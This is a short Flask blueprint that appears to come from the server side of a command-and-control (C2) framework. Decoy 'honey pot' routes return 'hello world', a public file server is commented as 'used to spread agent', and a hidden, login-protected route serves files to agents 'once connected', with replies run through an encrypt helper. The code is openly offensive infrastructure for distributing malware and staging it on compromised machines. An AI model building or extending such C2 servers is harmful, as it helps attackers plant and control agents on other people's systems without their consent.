# main.py

from flask import Blueprint, render_template, request, send_from_directory
from flask_login import login_required
from . import db, config, decrypt, encrypt

main = Blueprint('main', __name__)

# honey pot
@main.route('/')
def index():
    #index_count = Mission.query.get(index_count)
    #total_count = Mission.query.get(total_count)
    #index_count += 1
    #total_count += 1
    return "hello world" #render_template('index.html')

# honey pot
@main.route('/admin')
def admin():
    #admin_count = Mission.query.get(index_count)
    #total_count = Mission.query.get(total_count)
    return "hello world" #render_template('index.html')

# public file server used to spread agent
@main.route(config["endpoints"]["public_download"] + "/<path:filename>", methods = ['GET'])
def public_download(filename):
    print("[*] file requested: " + filename)
    try:
        return send_from_directory(directory=config["fileserver"]["public_download"], filename=filename, as_attachment=True)
    except Exception as e:
        print(str(e))
        return encrypt("[-] That file does not exist: " + filename)

# private file server only used once connected
@main.route(config["hidden_route"] + config["endpoints"]["private_download"] +"/<path:filename>", methods = ['GET'])
@login_required
def private_download(filename):
    print("[*] file requested: " + filename)
    try:
        return send_from_directory(directory=config["fileserver"]["private_download"], filename=filename, as_attachment=True)
    except Exception as e:
        print(str(e))
        return encrypt("[-] That file does not exist: " + filename)


